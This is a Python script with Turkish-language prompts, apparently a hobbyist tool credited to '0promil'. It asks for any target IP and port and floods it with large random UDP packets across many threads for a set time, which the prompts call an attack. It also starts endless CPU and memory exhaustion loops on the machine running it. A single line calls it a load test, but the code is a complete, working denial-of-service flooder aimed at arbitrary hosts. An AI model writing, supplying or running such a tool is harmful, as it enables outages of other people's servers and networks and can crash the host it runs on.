import socket
import threading
import time
import random
import math
import os


def display_header():
    header = """
  ██████ ██████  ██████   ██████  ███    ███ ██ ██           █       █ 
  █   ██ ██   ██ ██   ██ ██    ██ ████  ████ ██ ██        
  █ ██ █ ██████  ██████  ██    ██ ██ ████ ██ ██ ██       █               █
  ██   █ ██      ██   ██ ██    ██ ██  ██  ██ ██ ██        ███████████████
  ██████ ██      ██   ██  ██████  ██      ██ ██ ███████ 
     Yapımcı: 0promil
    """
    print("\033[H\033[J", end="")
    print(header)


target_ip = input("Hedef IP adresini girin: ")
target_port = int(input("Hedef portu girin: ")) 
num_threads = int(input("Kaç thread ile saldırı başlatılsın?: "))
attack_duration = int(input("Saldırının kaç saniye sürmesini istiyorsunuz?: "))
packet_size = int(input("Gönderilecek paket boyutunu girin (byte cinsinden, örn. 65507): "))  
rate_limit = 0  


packet_count = 0

def attack():
    global packet_count
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + attack_duration
    bytes_to_send = random._urandom(packet_size)  

    while time.time() < timeout:
        try:
            client.sendto(bytes_to_send, (target_ip, target_port))
            packet_count += 1
            if packet_count % 1000 == 0:  
                print(f"{packet_count} paket gönderildi.")
        except socket.error as e:
            print(f"Socket hatası: {e}")
            break


def cpu_stress():
    while True:
        math.factorial(100000)

def memory_stress():
    mem_hog = []
    while True:
        mem_hog.append(' ' * 1000000)  # 1 MB 

def start_attack():
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.daemon = True  
        threads.append(thread)
        thread.start()
        print(f"Thread {i+1} başlatıldı")

    for thread in threads:
        thread.join()

def start_stress_tests():
    for _ in range(4): 
        cpu_thread = threading.Thread(target=cpu_stress)
        cpu_thread.start()

    mem_thread = threading.Thread(target=memory_stress)
    mem_thread.start()

if __name__ == "__main__":
    display_header()  
    print("Sunucunuza hem ağ hem de CPU/bellek yük testi başlıyor...")
    start_time = time.time()

    attack_thread = threading.Thread(target=start_attack)
    stress_thread = threading.Thread(target=start_stress_tests)
    
    attack_thread.start()
    stress_thread.start()

    attack_thread.join() 
    end_time = time.time()

    print(f"{attack_duration} saniyelik saldırı sona erdi.")
    print(f"Toplam {packet_count} paket gönderildi.")
    print(f"Ortalama hız: {packet_count / (end_time - start_time):.2f} paket/saniye")
